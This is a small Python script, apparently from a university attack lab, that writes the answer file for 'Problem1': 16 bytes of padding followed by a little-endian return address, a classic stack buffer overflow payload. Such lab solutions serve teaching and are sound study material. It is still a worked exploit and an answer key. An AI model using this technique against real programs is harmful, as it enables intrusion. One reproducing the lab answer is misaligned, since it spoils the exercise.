#!/usr/bin/env python3
"""
Generate ans1.txt payload for Problem1.

Usage:
  python3 scripts/generate_ans1.py

This writes a 20-byte file matching the payload used in the lab:
  16 bytes padding + 4-byte little-endian target address
"""
from pathlib import Path

OUT_PATH = Path(__file__).resolve().parents[1] / "ans1.txt"

def main():
    padding = b"A" * 16
    # Low 4 bytes of target function address (little-endian)
    target_low4 = b"\x16\x12\x40\x00"
    payload = padding + target_low4
    OUT_PATH.write_bytes(payload)
    print(f"wrote {OUT_PATH} ({len(payload)} bytes)")

if __name__ == "__main__":
    main()


